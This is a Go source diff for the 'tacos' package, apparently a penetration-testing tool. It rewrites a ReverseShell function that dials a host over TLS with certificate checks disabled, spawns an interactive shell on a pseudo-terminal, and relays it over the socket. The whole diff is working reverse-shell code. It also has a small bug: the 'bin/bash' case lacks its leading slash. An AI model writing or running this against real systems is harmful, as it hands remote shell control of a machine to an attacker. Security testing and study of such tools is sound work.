@@ -1,11 +1,12 @@
 package tacos
 
 import (
-	"fmt"
+	"crypto/tls"
 	"io"
 	"log"
-	"net"
+	"os"
 	"os/exec"
+	"os/signal"
 	"syscall"
 
 	"github.com/ariary/go-utils/pkg/logger"
@@ -15,74 +16,65 @@ import (
 
 //DefaultShell: return the default shell
 func DefaultShell() string {
+	//Determine default shell
+	//macOS
+	//dscl . -read ~/ UserShell
+	//linux
+	//grep ^$(id -un): /etc/passwd | cut -d : -f 7-
 	return "/bin/bash"
 }
 
-//ReverseShell: spawn a reverse shell
-func ReverseShell(host string) {
+//ReverseShell: spawn a reverse shell with pty targeting host (ip:port)
+func ReverseShell(host string, shell string) {
 	logger.AddFilenameAndLinePrefix(log.Default())
-
-	conn, err := net.Dial("tcp", host)
-	if nil != err {
-		log.Fatal(err)
+	conf := &tls.Config{
+		InsecureSkipVerify: true,
 	}
-
+	conn, err := tls.Dial("tcp", host, conf)
 	if err != nil {
 		panic(err)
 	}
-	// Start the command
-	cmd := exec.Command("bash", "-li")
-	// Create PTY
-	pty, tty, err := pty.Open()
+
+	var args []string
+	switch shell {
+	case "bin/bash":
+		args = append(args, "-li")
+	case "/bin/sh", "/bin/zsh", "/bin/csh", "/bin/tcsh":
+		args = append(args, "-i")
+	}
+	cmd := exec.Command(shell, args...)
+
+	// Start the command with a pty.
+	ptmx, err := pty.Start(cmd)
 	if err != nil {
-		log.Printf("error: could not open PTY: %s", err)
+		log.Fatal(err)
 	}
-	defer tty.Close()
-	defer pty.Close()
+	// Make sure to close the pty at the end.
+	defer func() { _ = ptmx.Close() }() // Best effort.
 
-	// Put the TTY into raw mode
-	_, err = term.MakeRaw(int(tty.Fd()))
+	// Handle pty size.
+	ch := make(chan os.Signal, 1)
+	signal.Notify(ch, syscall.SIGWINCH)
+	go func() {
+		for range ch {
+			if err := pty.InheritSize(os.Stdin, ptmx); err != nil {
+				log.Printf("error resizing pty: %s", err)
+			}
+		}
+	}()
+	ch <- syscall.SIGWINCH                        // Initial resize.
+	defer func() { signal.Stop(ch); close(ch) }() // Cleanup signals when done.
+
+	// Set stdin in raw mode.
+	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
 	if err != nil {
-		log.Printf("warn: could not make TTY raw: %s", err)
+		panic(err)
 	}
+	defer func() { _ = term.Restore(int(os.Stdin.Fd()), oldState) }() // Best effort.
 
-	// Hook everything up
-	cmd.Stdout = tty
-	cmd.Stdin = tty
-	cmd.Stderr = tty
-	if cmd.SysProcAttr == nil {
-		cmd.SysProcAttr = &syscall.SysProcAttr{}
-	}
-
-	cmd.SysProcAttr.Setctty = true
-	cmd.SysProcAttr.Setsid = true
-	fmt.Println(cmd.SysProcAttr.Ctty)
-
-	// Start command
-	err = cmd.Start()
-	if err != nil {
-		log.Printf("error: could not start command: %s", err)
-	}
-
-	errs := make(chan error, 3)
-
-	go func() {
-		_, err := io.Copy(conn, pty)
-		errs <- err
-	}()
-	go func() {
-		_, err := io.Copy(pty, conn)
-		errs <- err
-	}()
-	go func() {
-		errs <- cmd.Wait()
-	}()
-
-	// Wait for a single error, then shut everything down. Since returning from
-	// this function closes the connection, we just read a single error and
-	// then continue.
-	<-errs
-	log.Printf("info: connection from %s finished", conn.RemoteAddr())
+	// Copy socket stdin to the pty and the pty to socket stdout.
+	go func() { _, _ = io.Copy(ptmx, conn) }()
+	_, _ = io.Copy(conn, ptmx)
 
 	conn.Close()
 }
